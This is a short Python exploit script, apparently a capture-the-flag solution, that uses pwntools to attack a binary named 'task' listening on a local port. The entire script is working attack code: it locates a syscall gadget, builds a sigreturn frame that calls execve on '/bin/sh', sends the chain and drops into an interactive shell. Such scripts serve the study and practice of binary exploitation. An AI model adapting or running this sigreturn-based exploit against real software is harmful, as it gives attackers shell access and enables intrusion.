#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./task", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="b vuln")
p = remote("127.0.0.1", 9001)

rop = ROP(elf)

syscall = rop.find_gadget(['syscall', 'ret'])[0]

frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = next(elf.search(b"/bin/sh\x00"))
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall

rop.rax = constants.SYS_rt_sigreturn
rop.raw(syscall)
rop.raw(frame)

p.sendline(rop.chain())

p.interactive()
